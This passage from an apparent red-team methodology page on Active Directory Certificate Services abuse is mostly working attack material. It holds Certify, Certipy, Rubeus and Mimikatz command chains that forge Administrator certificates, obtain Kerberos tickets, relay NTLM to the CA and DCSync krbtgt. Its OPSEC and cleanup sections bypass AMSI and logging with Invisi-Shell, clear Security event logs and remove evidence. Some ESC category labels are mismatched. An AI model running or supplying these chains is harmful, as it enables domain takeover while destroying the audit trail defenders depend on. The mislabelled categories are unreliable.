                $securityAssessment.SecurityRecommendations += "  - Risk Level: $riskLevel"
            }
        }
        
        # Display security assessment
        Write-Host "Certificate Template Security Assessment:" -ForegroundColor Green
        
        if ($securityAssessment.CriticalVulnerabilities.Count -gt 0) {
            Write-Host "`n🔴 CRITICAL VULNERABILITIES:" -ForegroundColor Red
            foreach ($vuln in $securityAssessment.CriticalVulnerabilities) {
                Write-Host "  Template: $($vuln.Template)"
                Write-Host "    Vulnerabilities: $($vuln.Vulnerabilities -join ', ')"
            }
        }
        
        if ($securityAssessment.HighVulnerabilities.Count -gt 0) {
            Write-Host "`n🟠 HIGH VULNERABILITIES:" -ForegroundColor DarkYellow
            foreach ($vuln in $securityAssessment.HighVulnerabilities) {
                Write-Host "  Template: $($vuln.Template)"
                Write-Host "    Vulnerabilities: $($vuln.Vulnerabilities -join ', ')"
            }
        }
        
        if ($securityAssessment.MediumVulnerabilities.Count -gt 0) {
            Write-Host "`n🟡 MEDIUM VULNERABILITIES:" -ForegroundColor Yellow
            foreach ($vuln in $securityAssessment.MediumVulnerabilities) {
                Write-Host "  Template: $($vuln.Template)"
                Write-Host "    Vulnerabilities: $($vuln.Vulnerabilities -join ', ')"
            }
        }
        
        if ($securityAssessment.LowVulnerabilities.Count -gt 0) {
            Write-Host "`n🟢 LOW VULNERABILITIES:" -ForegroundColor Green
            foreach ($vuln in $securityAssessment.LowVulnerabilities) {
                Write-Host "  Template: $($vuln.Template)"
                Write-Host "    Vulnerabilities: $($vuln.Vulnerabilities -join ', ')"
            }
        }
        
        # Display security recommendations
        if ($securityAssessment.SecurityRecommendations.Count -gt 0) {
            Write-Host "`nSecurity Recommendations:" -ForegroundColor Cyan
            foreach ($recommendation in $securityAssessment.SecurityRecommendations) {
                Write-Host "  $recommendation"
            }
        }
        
        return $securityAssessment
        
    }
    catch {
        Write-Warning "Certificate template security assessment failed: $($_.Exception.Message)"
        return $null
    }
}

# Assess certificate template security
$templateSecurity = Assess-CertificateTemplateSecurity -ADCSResults $adcsResults
```

**Tool Explanation:**
- **Security Assessment**: Assess certificate template security
- **Vulnerability Categorization**: Categorize vulnerabilities by risk level
- **Security Recommendations**: Generate security recommendations
- **Template Analysis**: Analyze template configurations
- **Advantages**: Security insights, risk assessment, recommendations
- **Disadvantages**: Complex analysis, requires security knowledge

### 2. Attack Vector Analysis

#### **Certificate Abuse Planning**
```powershell
# Plan certificate abuse attacks
function Plan-CertificateAbuseAttacks {
    param([hashtable]$ADCSResults)
    
    try {
        Write-Host "Planning certificate abuse attacks..." -ForegroundColor Yellow
        Write-Host "=" * 50
        
        $attackPlan = @{
            ImmediateAttacks = @()
            EscalationPaths = @()
            ToolRequirements = @()
            ExecutionSteps = @()
        }
        
        # Analyze vulnerable templates for immediate attacks
        foreach ($template in $ADCSResults.VulnerableTemplates) {
            if ($template.VulnerabilityReason -like "*Enrollee Supplies Subject*") {
                $attackPlan.ImmediateAttacks += @{
                    Template = $template.Name
                    AttackType = "SAN Abuse"
                    Description = "Request certificate with custom subject alternative name"
                    Tool = "Certify.exe"
                    Command = ".\Certify.exe request /ca:CA01.cybercorp.local /template:$($template.Name) /subject:CN=Administrator"
                    Risk = "High - Domain privilege escalation"
                }
            }
            
            if ($template.VulnerabilityReason -like "*Exportable Private Key*") {
                $attackPlan.ImmediateAttacks += @{
                    Template = $template.Name
                    AttackType = "Private Key Extraction"
                    Description = "Extract private key from certificate"
                    Tool = "Certify.exe + OpenSSL"
                    Command = ".\Certify.exe request /ca:CA01.cybercorp.local /template:$($template.Name) /export"
                    Risk = "Medium - Credential theft"
                }
            }
        }
        
        # Plan privilege escalation paths
        foreach ($attack in $attackPlan.ImmediateAttacks) {
            if ($attack.AttackType -eq "SAN Abuse") {
                $attackPlan.EscalationPaths += @{
                    Step = 1
                    Action = "Request certificate with Administrator SAN"
                    Tool = $attack.Tool
                    Command = $attack.Command
                    ExpectedResult = "Certificate with Administrator privileges"
                }
                
                $attackPlan.EscalationPaths += @{
                    Step = 2
                    Action = "Use certificate for authentication"
                    Tool = "Rubeus.exe"
                    Command = ".\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /outfile:admin.kirbi"
                    ExpectedResult = "Kerberos TGT for Administrator"
                }
                
                $attackPlan.EscalationPaths += @{
                    Step = 3
                    Action = "Perform privilege escalation"
                    Tool = "Mimikatz.exe"
                    Command = ".\mimikatz.exe kerberos::ptt admin.kirbi"
                    ExpectedResult = "Administrator privileges"
                }
            }
        }
        
        # Identify tool requirements
        $attackPlan.ToolRequirements = @(
            "Certify.exe - AD CS enumeration and abuse",
            "OpenSSL - Certificate manipulation",
            "Rubeus.exe - Kerberos ticket manipulation",
            "Mimikatz.exe - Credential extraction"
        )
        
        # Generate execution steps
        $attackPlan.ExecutionSteps = @(
            "1. Enumerate AD CS infrastructure",
            "2. Identify vulnerable certificate templates",
            "3. Request malicious certificates",
            "4. Extract private keys if exportable",
            "5. Use certificates for authentication",
            "6. Perform privilege escalation",
            "7. Clean up evidence"
        )
        
        # Display attack plan
        Write-Host "Certificate Abuse Attack Plan:" -ForegroundColor Green
        
        Write-Host "`nImmediate Attack Opportunities:" -ForegroundColor Red
        foreach ($attack in $attackPlan.ImmediateAttacks) {
            Write-Host "  Template: $($attack.Template)" -ForegroundColor Cyan
            Write-Host "    Attack Type: $($attack.AttackType)"
            Write-Host "    Description: $($attack.Description)"
            Write-Host "    Tool: $($attack.Tool)"
            Write-Host "    Command: $($attack.Command)"
            Write-Host "    Risk: $($attack.Risk)"
            Write-Host ""
        }
        
        Write-Host "Privilege Escalation Paths:" -ForegroundColor Yellow
        foreach ($step in $attackPlan.EscalationPaths) {
            Write-Host "  Step $($step.Step): $($step.Action)" -ForegroundColor Cyan
            Write-Host "    Tool: $($step.Tool)"
            Write-Host "    Command: $($step.Command)"
            Write-Host "    Expected Result: $($step.ExpectedResult)"
            Write-Host ""
        }
        
        Write-Host "Required Tools:" -ForegroundColor Green
        foreach ($tool in $attackPlan.ToolRequirements) {
            Write-Host "  - $tool"
        }
        
        Write-Host "`nExecution Steps:" -ForegroundColor Cyan
        foreach ($step in $attackPlan.ExecutionSteps) {
            Write-Host "  $step"
        }
        
        return $attackPlan
        
    }
    catch {
        Write-Warning "Certificate abuse attack planning failed: $($_.Exception.Message)"
        return $null
    }
}

# Plan certificate abuse attacks
$attackPlan = Plan-CertificateAbuseAttacks -ADCSResults $adcsResults
```

**Tool Explanation:**
- **Attack Planning**: Plan certificate abuse attacks
- **Escalation Paths**: Map privilege escalation paths
- **Tool Requirements**: Identify required tools
- **Execution Steps**: Generate execution steps
- **Advantages**: Attack planning, tool identification, execution guidance
- **Disadvantages**: Complex planning, requires attack knowledge

## 🚀 Practical AD CS Attacks

### **Certificate Template Abuse Commands**

#### **1. Certify - AD CS Enumeration and Abuse**
```powershell
# Basic AD CS enumeration
.\Certify.exe cas

# List certificate authorities
.\Certify.exe cas /enrolleeSuppliesSubject

# Find vulnerable certificate templates
.\Certify.exe find /enrolleeSuppliesSubject

# Request certificate with custom subject
.\Certify.exe request /ca:CA01.cybercorp.local /template:User /subject:CN=Administrator

# Request certificate with custom SAN
.\Certify.exe request /ca:CA01.cybercorp.local /template:User /subject:CN=User /altname:Administrator

# Export certificate and private key
.\Certify.exe request /ca:CA01.cybercorp.local /template:User /subject:CN=User /export
```

#### **2. PowerView Certificate Abuse**
```powershell
# Find vulnerable templates for abuse
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties * | Where-Object {
    $_.'msPKI-Enrollment-Flag' -band 0x00000002  # Enrollee Supplies Subject
} | Select-Object displayName,name,msPKI-Enrollment-Flag

# Check enrollment permissions
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties * | 
    ForEach-Object {
        $template = $_
        $acl = $template.nTSecurityDescriptor
        Write-Host "Template: $($template.displayName)"
        Write-Host "  Enrollment Permissions: $($acl.Access)"
    }

# Find high-value templates
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties * | 
    Where-Object {$_.displayName -like "*Admin*" -or $_.displayName -like "*Domain*"}
```

#### **3. Certificate-Based Authentication**
```powershell
# Use certificate for Kerberos authentication
.\Rubeus.exe asktgt /user:Administrator /certificate:cert.pfx /outfile:admin.kirbi

# Use certificate for S4U2Self
.\Rubeus.exe s4u /user:Administrator /certificate:cert.pfx /impersonateuser:Administrator /msdsspn:cifs/DC01.cybercorp.local

# Convert certificate to hash
.\Rubeus.exe hash /password:cert.pfx

# Use certificate with Mimikatz
.\mimikatz.exe "crypto::capi" "crypto::cng" "kerberos::ptt admin.kirbi" "exit"
```

### **Certificate Template Exploitation Workflow**


## OPSEC Considerations

### 1. Stealth Techniques
- **Gradual Enumeration**: Spread AD CS queries over time
- **Targeted Queries**: Focus on specific AD CS components
- **Normal User Context**: Use regular user accounts when possible
- **Limited Scope**: Focus on necessary AD CS information

### 2. Detection Avoidance
- **Event Logging**: Be aware of AD CS enumeration events
- **Network Monitoring**: Consider network traffic patterns
- **Query Patterns**: Avoid predictable query patterns
- **Response Analysis**: Analyze responses for anomalies

## Best Practices

### 1. AD CS Enumeration
- **Scope Definition**: Clearly define enumeration scope
- **Tool Selection**: Choose appropriate AD CS enumeration methods
- **Documentation**: Document all enumeration activities
- **Validation**: Verify discovered AD CS information

### 2. Security Analysis
- **Configuration Review**: Thoroughly review AD CS configurations
- **Vulnerability Assessment**: Identify AD CS security weaknesses
- **Documentation**: Document all security findings
- **Reporting**: Generate comprehensive security reports

## Related Objects
- [SPN Enumeration](./24_SPN_Enumeration_Techniques.md)
- [SQL Server Enumeration](./28_SQL_Server_Enumeration.md)
- [GPO Enumeration](./08_GPO_Enumeration.md)
- [Kerberos Basic Enumeration](./23_Kerberos_Basic_Enumeration.md)

## Navigation
- [Enumeration Index](./00_Enumeration_Index.md)

## See Also
- [Time-Based Enumeration](./21_Time_Based_Enumeration.md)
- [WMI Enumeration](./20_WMI_Enumeration.md)

---

**Tags**: #ADCSEnumeration #ActiveDirectory #AD #Enumeration #CertificateServices #Certificates #RedTeam

---

## 🔗 CROSS-REFERENCES
- See `12_Kerberos_Master_Index.md` for Kerberos basics and ticket usage
- See `16_Kerberos_Advanced_Attacks.md` for ticket injection and abuse
- See `01_Tool_Setup_Loading.md` for installing Certify, Certipy, and Rubeus
- See `11_Detection_Blue_Team.md` and `12_Detection_Red_Team.md` for detection/evasion

---

## 🚀 Complete AD CS Abuse Workflows

### 1) ESC1/ESC2: EnrolleeSuppliesSubject and SAN Abuse (Certify)
```powershell
# Find vulnerable templates
.\Certify.exe find /enrolleeSuppliesSubject

# Request a certificate impersonating Administrator (subject CN)
.\Certify.exe request /ca:CA01.cybercorp.local /template:User /subject:CN=Administrator /outfile:admin.pfx /password:P@ssw0rd!

# Alternative: Abuse SAN (SubjectAltName) if allowed
.\Certify.exe request /ca:CA01.cybercorp.local /template:User /altname:administrator@cybercorp.local /outfile:admin-san.pfx /password:P@ssw0rd!

# Use certificate for PKINIT to get TGT
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:P@ssw0rd! /outfile:admin.kirbi

# Inject TGT and operate
.\mimikatz.exe "kerberos::ptt admin.kirbi" "exit"
```

### 2) ESC3/ESC4: Client Authentication EKU and Any Purpose EKU (Certipy)
```bash
# Enumerate templates and CAs
certipy find -u 'user@cybercorp.local' -p 'Password123!' -dc-ip 10.0.0.10 -vulnerable

# Request a client-auth certificate from vulnerable template (e.g., User)
certipy req -u 'user@cybercorp.local' -p 'Password123!' -target 'ca01.cybercorp.local' \
  -template 'User' -upn 'administrator@cybercorp.local' -key-size 2048 -out admin

# Authenticate using PKINIT and get TGT
certipy auth -pfx admin.pfx -dc-ip 10.0.0.10 -username 'Administrator' -domain 'cybercorp.local' -no-pass

# Reusable: convert PFX to PEM if needed
certipy cert -pfx admin.pfx -keyout admin.key -certout admin.crt
```

### 3) ESC6: Enrollment Agent (EA) Abuse
```powershell
# Find templates with EnrollmentAgent EKU
.\Certify.exe find /enrollmentAgent

# Request EA certificate (requires enroll rights)
.\Certify.exe request /ca:CA01.cybercorp.local /template:EnrollmentAgent /outfile:ea.pfx /password:P@ssw0rd!

# Use EA to request on behalf of Administrator
.\Certify.exe request /ca:CA01.cybercorp.local /template:User /onbehalfof:administrator@cybercorp.local \
  /enrollcert:ea.pfx /enrollcertpw:P@ssw0rd! /outfile:admin.pfx /password:P@ssw0rd!

# Turn cert into TGT
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:P@ssw0rd! /outfile:admin.kirbi
```

### 4) ESC8: Weak ACLs on Templates/CA Objects (WriteOwner/WriteDACL)
```powershell
# Discover weak ACLs on pKI objects
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties nTSecurityDescriptor,displayName | \
  Where-Object { $_.nTSecurityDescriptor -match "WriteOwner|WriteDACL" } | \
  Select-Object displayName

# If you can modify template: add EnrolleeSuppliesSubject and ClientAuth EKU, then abuse as in ESC1/ESC3
```

### 5) Web Enrollment/NTLM Relay to AD CS (HTTP Enrollment)
```bash
# If HTTP enrollment is enabled (certsrv), relay NTLM to obtain a cert (PetitPotam/Coercer chain)
# 1) Coerce auth to web enrollment
coercer relay -t http://ca01.cybercorp.local/certsrv -l 0.0.0.0 -r 445

# 2) Relay and auto-request certificate (roadtools or custom relayer)
# Ensure target template allows client auth and enrollee supplies subject
```

---

## 🎯 End-to-End Example: From Template to DA Access
```powershell
# 1) Identify vulnerable template
.\Certify.exe find /enrolleeSuppliesSubject

# 2) Request Administrator certificate via SAN
.\Certify.exe request /ca:CA01.cybercorp.local /template:User /altname:administrator@cybercorp.local /outfile:admin.pfx /password:P@ssw0rd!

# 3) Get TGT via PKINIT
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:P@ssw0rd! /outfile:admin.kirbi

# 4) Inject and operate
.\mimikatz.exe "kerberos::ptt admin.kirbi" "exit"

# 5) Lateral move and DCSync (example)
Invoke-Mimikatz -Command '"lsadump::dcsync /user:cybercorp\\krbtgt"'
```

---

## 🧰 Quick Reference: Tool Mappings
- Discovery: `certutil`, PowerView (`Get-DomainObject` filters), `Certify.exe cas/find`, `certipy find`
- Request: `Certify.exe request`, `certipy req`
- Auth: `Rubeus.exe asktgt|s4u`, `certipy auth`
- Pivot: Kerberos ticket ptt via `mimikatz`

---

## ⚠️ OPSEC and Detection Notes
- Template enumeration and certificate requests generate logs on CA; pace requests and blend with normal activity
- PKINIT and unusual SAN/UPN values can be flagged; prefer legitimate-looking subjects
- Monitor Event IDs: 4886-4899 (Certification Services), 4769 (TGS), 4771 (Kerberos pre-auth)
- See `11_Detection_Blue_Team.md` and `12_Detection_Red_Team.md` for rules and evasion

---

## ⚔️ Execution (ESC Map)

- ESC1/ESC2/ESC3: EnrolleeSuppliesSubject / ClientAuth EKU
```powershell
# Certify (subject/SAN abuse) → PKINIT with Rubeus
.\Certify.exe find /enrolleeSuppliesSubject
.\Certify.exe request /ca:CA01 /template:User /subject:CN=Administrator /outfile:admin.pfx /password:P@ssw0rd!
.\Rubeus.exe asktgt /user:Administrator /certificate:admin.pfx /password:P@ssw0rd! /outfile:admin.kirbi
```

- ESC4/ESC5: AnyPurpose / EKU misconfig
```powershell
# Certipy flow for client auth where EKU allows logon
certipy find -u user@domain.local -p Passw0rd! -vulnerable
certipy req -u user@domain.local -p Passw0rd! -template User -upn administrator@domain.local -out admin
certipy auth -pfx admin.pfx -username Administrator -domain domain.local -no-pass
```

- ESC6: Enrollment Agent
```powershell
.\Certify.exe find /enrollmentAgent
.\Certify.exe request /ca:CA01 /template:EnrollmentAgent /outfile:ea.pfx /password:P@ssw0rd!
.\Certify.exe request /ca:CA01 /template:User /onbehalfof:administrator@domain.local /enrollcert:ea.pfx /enrollcertpw:P@ssw0rd! /outfile:admin.pfx
```

- ESC7/ESC8: Weak ACLs / CA misconfig
```powershell
# Modify template ACLs (if writable) then follow ESC1/3 flow
Get-DomainObject -LDAPFilter "(objectClass=pKICertificateTemplate)" -Properties nTSecurityDescriptor,displayName | \
  ? { $_.nTSecurityDescriptor -match 'WriteDACL|WriteOwner' } | select displayName
```

- Relay to AD CS (HTTP enrollment)
```bash
coercer relay -t http://ca01.domain.local/certsrv -l 0.0.0.0 -r 445
python3 ntlmrelayx.py -t http://ca01.domain.local/certsrv/ --adcs --template User -smb2support
```

- See detailed commands above in this file; detection in `11_Detection_Blue_Team.md`, OPSEC in `12_Detection_Red_Team.md`.

---

## 👥 **PERSONAS: AD CS ENUMERATION ROLES**

### **🔍 Reconnaissance Specialist**
- **Focus**: CA discovery, template enumeration, infrastructure mapping
- **Tools**: certutil, Get-ADObject, PowerView
- **Output**: AD CS topology, template inventory, service locations
- **Timeline**: 2-4 hours for comprehensive mapping

### **⚔️ Vulnerability Assessor**
- **Focus**: Template security analysis, ESC vulnerability identification
- **Tools**: PowerView filters, Certify, Certipy
- **Output**: Vulnerability matrix, risk assessment, attack vectors
- **Timeline**: 1-2 hours for security analysis

### **🚀 Exploitation Engineer**
- **Focus**: Certificate abuse, PKINIT, privilege escalation
- **Tools**: Certify, Certipy, Rubeus, Mimikatz
- **Output**: Malicious certificates, Kerberos tickets, elevated access
- **Timeline**: 30 minutes to 2 hours depending on complexity

### **🛡️ OPSEC Coordinator**
- **Focus**: Stealth operations, detection avoidance, cleanup
- **Tools**: Invisi-Shell, timing controls, log analysis
- **Output**: Stealth protocols, detection metrics, cleanup procedures
- **Timeline**: Continuous throughout operation

---

## 🎨 **VISUAL MASTERY: AD CS ATTACK FLOWS**

### **Certificate Template Abuse Workflow**

```mermaid
flowchart TD
    subgraph "🔍 Discovery Phase"
        A[🎯 Invisi-Shell Setup] --> B[🔍 CA Discovery]
        B --> C[📋 Template Enumeration]
        C --> D[⚠️ Vulnerability Assessment]
    end
    
    subgraph "⚔️ Exploitation Phase"
        D --> E[🔑 Certificate Request]
        E --> F[📜 Malicious Certificate]
        F --> G[🎫 PKINIT Authentication]
        G --> H[🔓 Elevated Access]
    end
    
    subgraph "🔄 Persistence Phase"
        H --> I[💾 Certificate Storage]
        I --> J[🔄 Reusable Authentication]
        J --> K[🎯 Lateral Movement]
    end
    
    %% Styling
    classDef discovery fill:#e3f2fd,stroke:#1565c0,stroke-width:3px
    classDef exploitation fill:#ffebee,stroke:#d32f2f,stroke-width:3px
    classDef persistence fill:#f3e5f5,stroke:#7b1fa2,stroke-width:3px
    
    class A,B,C,D discovery
    class E,F,G,H exploitation
    class I,J,K persistence
```


### **ESC Vulnerability Mapping**

```mermaid
mindmap
  root((ESC Vulnerabilities))
    🔴 Critical
      ESC1
        EnrolleeSuppliesSubject
        Subject abuse
      ESC2
        EnrolleeSuppliesSubjectAltName
        SAN abuse
      ESC3
        ClientAuth EKU
        PKINIT abuse
    🟠 High
      ESC4
        AnyPurpose EKU
        Multi-purpose abuse
      ESC5
        EnrollmentAgent EKU
        OBO abuse
    🟡 Medium
      ESC6
        Weak ACLs
        Template modification
      ESC7
        CA misconfig
        Service abuse
    🟢 Low
      ESC8
        HTTP enrollment
        Relay attacks
```


---

## 🧪 **LAB vs PRODUCTION EXECUTION PROFILES**

### **🧪 LAB ENVIRONMENT**
- **Timing**: No restrictions, immediate execution
- **Scope**: Full enumeration, all templates, comprehensive analysis
- **Tools**: All tools available, no stealth requirements
- **Logging**: Minimal concern, focus on learning
- **Risk**: Low, controlled environment

### **🏢 PRODUCTION ENVIRONMENT**
- **Timing**: 3-6 second jitter between queries, gradual escalation
- **Scope**: Targeted enumeration, focus on vulnerable templates
- **Tools**: Invisi-Shell mandatory, stealth-first approach
- **Logging**: Maximum stealth, minimal footprint
- **Risk**: High, detection consequences

### **⚡ BALANCED APPROACH**
- **Timing**: 1-2 second jitter, moderate pace
- **Scope**: Strategic enumeration, vulnerability-focused
- **Tools**: Invisi-Shell + selective tooling
- **Logging**: Moderate stealth, controlled visibility
- **Risk**: Medium, balanced approach

---

## 🔒 **DETECTION/OPSEC & CLEANUP**

### **🔒 STEALTH REQUIREMENTS**
> **⚠️ CRITICAL**: **Invisi-Shell** must be loaded before any AD CS enumeration in production environments to bypass logging and AMSI detection.

#### **OPSEC Best Practices**
- **Timing Control**: Use 3-6 second jitter between queries
- **Query Patterns**: Avoid predictable enumeration sequences
- **Tool Selection**: Use Microsoft-signed tools when possible
- **Scope Limitation**: Focus on specific AD CS components
- **Response Analysis**: Monitor for detection indicators

#### **Detection Avoidance**
- **Event Logging**: Minimize AD CS enumeration events
- **Network Monitoring**: Blend with normal certificate activity
- **Query Volume**: Limit concurrent queries
- **Tool Signatures**: Use native tools to avoid detection
- **Response Patterns**: Analyze responses for anomalies

### **🧹 Cleanup Procedures**

#### **Certificate Cleanup**
```powershell
# Remove malicious certificates
Get-ChildItem -Path "Cert:\CurrentUser\My" | Where-Object {
    $_.Subject -like "*Administrator*" -or $_.Subject -like "*Admin*"
} | Remove-Item -Force

# Clear certificate store cache
certutil -setreg CA\CRLPeriodUnits 0
certutil -setreg CA\CRLPeriod 0
```

#### **Log Cleanup**
```powershell
# Clear relevant event logs (requires elevation)
Clear-EventLog -LogName "Application" -Source "CertSvc"
Clear-EventLog -LogName "Security" -Source "Microsoft-Windows-Security-Auditing"
```

#### **Evidence Removal**
- **Temporary Files**: Remove certificate files (.pfx, .pem, .kirbi)
- **Command History**: Clear PowerShell history
- **Registry Keys**: Remove any custom registry entries
- **Network Traces**: Clear network connection logs

---

## 🔗 **CROSS-REFERENCES & INTEGRATION**

### **📚 Related Enumeration Techniques**
- **[SPN Enumeration](./24_SPN_Enumeration_Techniques.md)**: Discover AD CS service accounts
- **[Kerberos Basic Enumeration](./23_Kerberos_Basic_Enumeration.md)**: Understand PKINIT authentication
- **[Kerberos Advanced Attacks](./26_Kerberos_Advanced_Attacks.md)**: Ticket manipulation and abuse
- **[GPO Enumeration](./08_GPO_Enumeration.md)**: Auto-enrollment policies
- **[ACL Enumeration](./09_ACL_Enumeration.md)**: Template permission analysis

### **🛠️ Tool Integration**
- **[Tool Setup & Loading](./01_Tool_Setup_Loading.md)**: Invisi-Shell, PowerView, Certify setup
- **[PowerShell Remoting](./19_PowerShell_Remoting_Enumeration.md)**: Remote AD CS enumeration
- **[WMI Enumeration](./20_WMI_Enumeration.md)**: Certificate store enumeration
- **[Registry Enumeration](./18_Registry_Enumeration.md)**: CA configuration analysis

### **🎯 Attack Path Integration**
- **[User Enumeration](./05_User_Enumeration.md)**: Target identification for certificate abuse
- **[Computer Enumeration](./07_Computer_Enumeration.md)**: CA server discovery
- **[Session Enumeration](./13_Active_Session_Discovery.md)**: Certificate-based authentication
- **[BloodHound Integration](./10_BloodHound_Enumeration.md)**: AD CS attack path mapping

### **🛡️ Detection & Defense**
- **[Blue Team Detection](./32_Detection_Blue_Team.md)**: AD CS monitoring and alerting
- **[Red Team OPSEC](./33_Detection_Red_Team.md)**: Stealth techniques and evasion
- ****Remediation Planning (removed)****: AD CS security hardening

---

[Prev: 26_Kerberos_Advanced_Attacks.md](./26_Kerberos_Advanced_Attacks.md) | [Up: Index](./00_Enumeration_Index.md) | [Hub](./00_Methodology_Hub.md) | [Next: 28_SQL_Server_Enumeration.md](./28_SQL_Server_Enumeration.md)
